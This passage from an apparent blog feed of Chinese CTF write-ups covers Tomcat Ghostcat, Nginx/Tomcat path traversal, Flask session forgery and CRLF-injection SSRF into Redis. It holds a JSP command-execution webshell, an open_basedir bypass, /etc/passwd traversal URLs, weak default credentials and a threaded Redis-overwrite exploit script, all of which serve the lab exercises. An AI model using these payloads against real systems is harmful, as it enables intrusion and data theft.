mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure><img src="/2020/07/30/NCTF2019-phar-matches-everything/7.png" class=""><p>再重新生成一下phar文件再传上去访问</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/8.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>WUSTCTF2020</title>
    <link href="http://yoursite.com/2020/07/28/WUSTCTF2020/"/>
    <id>http://yoursite.com/2020/07/28/WUSTCTF2020/</id>
    <published>2020-07-28T04:09:33.000Z</published>
    <updated>2020-07-28T09:49:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb<a id="more"></a></h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>JSP</li><li>CVE-2020-1938幽灵猫文件包含</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题，是一个文件上传，任意上传一个文件，回得到一个链接，点击可以进行下载</p><p>测试发现存在任意文件读取，可以任意下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2f1070d6-bc24-4d35-adb5-15c7449d3e83.node3.buuoj.cn&#x2F;download?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>在配置文件中没有发现存在的用户，也就不能够下载.bash_history,也就意味着通过查看history文件来获取flag路径走不通了</p><p>测试发现是Tomcat/8.5.42，8009端口是开放的，看了一下题解是考察CVE-2020-1938幽灵猫文件包含</p><p>问星盟里的师傅要了个poc，用ajpshooter可以进行包含</p><p>上传一个jsp文件拿到路径</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">"Executing command"</span>);</span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="string">"ls / -al"</span>);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream in = p.getInputStream();</span><br><span class="line">DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);</span><br><span class="line">String disr = dis.readLine();</span><br><span class="line"><span class="keyword">while</span> ( disr != <span class="keyword">null</span> ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><img src="/2020/07/28/WUSTCTF2020/1.png" class=""><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://<span class="number">2</span>f1070d6-bc24-<span class="number">4</span>d35-adb5-<span class="number">15</span>c7449d3e83.node3.buuoj.cn:<span class="number">8009</span>/ <span class="number">8009</span> /WEB-INF/uploads/b33c1c1f-<span class="number">22</span>ee-<span class="number">4369</span>-<span class="number">95</span><span class="built_in">cd</span>-<span class="number">945</span>e941a65bb.jsp eval</span><br></pre></td></tr></table></figure><p>再用内网靶机打的时候总是提示说连接失败，不知道咋回事，就先不管了</p><p>下面的步骤很简单，拿到路径之后，读取flag文件，再打一次过去就可以了</p><h2 id="WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="[WUSTCTF2020]Train Yourself To Be Godly"></a>[WUSTCTF2020]Train Yourself To Be Godly</h2><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li><p>tomcat目录穿越</p></li><li><p>TOMCAT管理端弱口令</p></li><li><p>后台上传war木马</p></li><li><p>Cookie</p></li></ul><h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="TOMCAT目录穿越"><a href="#TOMCAT目录穿越" class="headerlink" title="TOMCAT目录穿越"></a>TOMCAT目录穿越</h3><p>根据image师傅的wp找到了Orange师傅在BlackHat上作的议题(<a href="https://www.youtube.com/watch?v=28xWcRegncw" target="_blank" rel="noopener">DEF CON 26 – Orange Tsai – Breaking Parser Logic Take Your Path Normalization Off and Pop 0Days Out</a>)有时间的都可以去瞻仰风采顺便学习一波知识</p><p>下面的总结来自视频</p><img src="/2020/07/28/WUSTCTF2020/2.png" class=""><p>Nginx 会解析 /a;evil/b/，并认为这是一个合法的目录请求，而 Tomcat 做解析的时候会自动忽略掉脏数据 ;.*，所以 Tomcat 对此的解析是 /a/b/。也就是说我们从可以通过写 ;+脏数据的方式绕过 Nginx 的反向代理，从而请求本不应该能请求到的非法路径</p><p>下面这张图片简单明了</p><img src="/2020/07/28/WUSTCTF2020/3.png" class=""><p>所以第一层目录穿越/..;/可以来到上层目录，也就能够来到后台</p><h3 id="TOMCAT管理端弱口令"><a href="#TOMCAT管理端弱口令" class="headerlink" title="TOMCAT管理端弱口令"></a>TOMCAT管理端弱口令</h3><p>根据做题经验，一般是弱口令或者默认口令，用户名一般就是tomcat，然后爆破一下得到密码也是tomcat</p><h3 id="后台上传war木马"><a href="#后台上传war木马" class="headerlink" title="后台上传war木马"></a>后台上传war木马</h3><p><a href="https://github.com/LandGrey/webshell-detect-bypass，用这里面的poc" target="_blank" rel="noopener">https://github.com/LandGrey/webshell-detect-bypass，用这里面的poc</a></p><p>把jsp打包压缩成war文件，burp抓包上传</p><img src="/2020/07/28/WUSTCTF2020/4.png" class=""><p>可以发现是自动进行了路径拼接，去掉example继续访问</p><img src="/2020/07/28/WUSTCTF2020/5.png" class=""><p>返回401，Unauthorized</p><p>这里是一个新知识点，<a href="https://www.jianshu.com/p/4cd42f7359f4，详细介绍" target="_blank" rel="noopener">https://www.jianshu.com/p/4cd42f7359f4，详细介绍</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic base64encode(username+&quot;:&quot;+password)</span><br></pre></td></tr></table></figure><p>所以加上头字段就行</p><p>这时候会发现返回403，路径访问到了，却无法访问，一般情况下就是权限不够，缺少cookie，这里加上cookie字段，如果还是403，再刷新一下cookie进行添加即可</p><img src="/2020/07/28/WUSTCTF2020/6.png" class=""><p>可以看到上传的1.war已经上传加载完成了，接下来就是访问🐎在的路径了</p><img src="/2020/07/28/WUSTCTF2020/7.png" class=""><p>到这里可以看到路径都没有错，但是还是不能访问，猜测这里可能还是要进行目录穿越，加上/..;/成功</p><img src="/2020/07/28/WUSTCTF2020/8.png" class=""><p>在根目录下找到flag，和原题还是不太一样，原题这里还有一个小trick，这里直接读就行了</p><img src="/2020/07/28/WUSTCTF2020/9.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;easyweb&quot;&gt;&lt;a href=&quot;#easyweb&quot; class=&quot;headerlink&quot; title=&quot;easyweb&quot;&gt;&lt;/a&gt;easyweb
    
    </summary>
    
    
    
      <category term="WUST" scheme="http://yoursite.com/tags/WUST/"/>
    
  </entry>
  
  <entry>
    <title>PASECA2019-honey-shop</title>
    <link href="http://yoursite.com/2020/07/27/PASECA2019-honey-shop/"/>
    <id>http://yoursite.com/2020/07/27/PASECA2019-honey-shop/</id>
    <published>2020-07-27T04:00:15.000Z</published>
    <updated>2020-07-27T04:53:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点<a id="more"></a></h2><ul><li>flask_session</li><li>linux下的当前进程环境变量查看</li></ul><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>打开题目，是一个购买页面，抓个包</p><img src="/2020/07/27/PASECA2019-honey-shop/1.png" class=""><p>看到session的格式不用想就是flask_session，接下来就是要找到secret_key来伪造session达到修改金钱的目的</p><p>接着网页源代码看一下，发现有提示</p><img src="/2020/07/27/PASECA2019-honey-shop/2.png" class=""><p>存在download路径可以下载图片</p><p>这里就是最后的利用点了</p><p>先来看一下/etc/passwd</p><img src="/2020/07/27/PASECA2019-honey-shop/3.png" class=""><p>这里没有其他用户也没有bash，就不能知晓python的路径，这里就要用到当前进程的环境变量</p><img src="/2020/07/27/PASECA2019-honey-shop/4.png" class=""><p>拿到了secret_key,伪造session</p><img src="/2020/07/27/PASECA2019-honey-shop/5.png" class=""><p>在题目页面替换一下cookie就能购买flag了</p><img src="/2020/07/27/PASECA2019-honey-shop/6.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF-2016-Web7</title>
    <link href="http://yoursite.com/2020/07/27/SWPUCTF-2016-Web7/"/>
    <id>http://yoursite.com/2020/07/27/SWPUCTF-2016-Web7/</id>
    <published>2020-07-27T03:11:53.000Z</published>
    <updated>2020-08-03T08:06:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点<a id="more"></a></h2><ul><li>urllib2.urlopen()不支持gopher协议</li><li>urllib2.urlopen()未考虑换行符</li><li>redis写数据的方法</li></ul><h2 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h2><p>python2.7.5+redis2.6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cherrypy</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web7</span>:</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;script&gt; window.location.href='/input';&lt;/script&gt;"</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(self,url=<span class="string">""</span>,submit=<span class="string">""</span>)</span>:</span></span><br><span class="line">        file=open(<span class="string">"index.html"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">        reheaders=<span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">"GET"</span>:</span><br><span class="line">            reheaders=<span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url=cherrypy.request.params[<span class="string">"url"</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">"submit"</span>]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                    reheaders=reheaders+x+<span class="string">"&lt;br&gt;"</span></span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                reheaders=<span class="string">"错误"</span>+str(e)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                reheaders=reheaders+x+<span class="string">"&lt;br&gt;"</span></span><br><span class="line">        file=file.replace(<span class="string">"&lt;?response?&gt;"</span>,reheaders)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self,password=<span class="string">""</span>,submit=<span class="string">""</span>)</span>:</span></span><br><span class="line">        pool = redis.ConnectionPool(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">6379</span>)</span><br><span class="line">        r = redis.Redis(connection_pool=pool)</span><br><span class="line">        re=<span class="string">""</span></span><br><span class="line">        file=open(<span class="string">"login.html"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">"GET"</span>:</span><br><span class="line">            re=<span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password=cherrypy.request.params[<span class="string">"password"</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">"submit"</span>]</span><br><span class="line">            <span class="keyword">if</span> r.get(<span class="string">"admin"</span>)==password:</span><br><span class="line">                re=open(<span class="string">"flag"</span>,<span class="string">'r'</span>).readline()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                re=<span class="string">"Can't find admin:"</span>+password+<span class="string">",fast fast fast....."</span></span><br><span class="line">        file=file.replace(<span class="string">"&lt;?response?&gt;"</span>,re)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line">cherrypy.config.update(&#123;<span class="string">'server.socket_host'</span>: <span class="string">'0.0.0.0'</span>,</span><br><span class="line">                        <span class="string">'server.socket_port'</span>: <span class="number">8080</span>,</span><br><span class="line">                       &#125;)</span><br><span class="line">cherrypy.quickstart(web7(),<span class="string">'/'</span>)</span><br></pre></td></tr></table></figure><p>分析上面的代码，可以发现我们有两个输入的地方，第一个是输入url，urllib2.urlopen()会对我们输入的url进行访问，如果不符合的话就会报错。第二个对方就是登录检验，如果能够成功登录的话就会给到flag。这里应该是要ssrf+redis了，但是注意到urllib2.open()不支持gopher协议，就打不到redis。查资料找到了一篇文章，<a href="https://bugs.python.org/issue30458，借用文章的例子，urllib2.open()是不会处理换行符的" target="_blank" rel="noopener">https://bugs.python.org/issue30458，借用文章的例子，urllib2.open()是不会处理换行符的</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">urlopen(<span class="string">"http://localhost:8000/ HTTP/1.1\r\nHEADER: INJECTED\r\nIgnore:"</span>)</span><br><span class="line"></span><br><span class="line">Data sent to the server:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server.bind((<span class="string">"localhost"</span>, <span class="number">8000</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server.listen()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[conn, addr] = server.accept()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pprint(conn.recv(<span class="number">300</span>).splitlines(keepends=<span class="literal">True</span>))</span><br><span class="line">[<span class="string">b'GET / HTTP/1.1\r\n'</span>,</span><br><span class="line"> <span class="string">b'HEADER: INJECTED\r\n'</span>,</span><br><span class="line"> <span class="string">b'Ignore: HTTP/1.1\r\n'</span>,</span><br><span class="line"> <span class="string">b'Accept-Encoding: identity\r\n'</span>,</span><br><span class="line"> <span class="string">b'User-Agent: Python-urllib/3.5\r\n'</span>,</span><br><span class="line"> <span class="string">b'Connection: close\r\n'</span>,</span><br><span class="line"> <span class="string">b'Host: localhost:8000\r\n'</span>,</span><br><span class="line"> <span class="string">b'\r\n'</span>]</span><br></pre></td></tr></table></figure><p>所以这里用换行符也就是%0d%0a,插入到正常的url中就可以绕过了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload：http:&#x2F;&#x2F;127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379&#x2F;foo</span><br></pre></td></tr></table></figure><p>这里打过去之后要快速登录，就能拿到flag，因为后台有脚本在不断修改密码</p><img src="/2020/07/27/SWPUCTF-2016-Web7/1.png" class=""><p>当然也可以用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">"http://web7.08067.me/web7/input"</span></span><br><span class="line">            data = &#123;<span class="string">'value'</span>: <span class="string">'http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20admin%20xx00%0d%0aSAVE%0d%0a:6379/foo'</span>&#125;</span><br><span class="line">            requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">"http://web7.08067.me/web7/admin"</span></span><br><span class="line">            data = &#123;<span class="string">'passworld'</span>: <span class="string">'xx00'</span>&#125;</span><br><span class="line">            text = requests.post(url, data=data).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> text:</span><br><span class="line">                <span class="keyword">print</span> text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=test)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=test2)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">    i.join()</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://www.anquanke.com/post/id/84814" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84814</a></li><li><a href="https://bugs.python.org/issue30458" target="_blank" rel="noopener">https://bugs.python.org/issue30458</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
</feed>
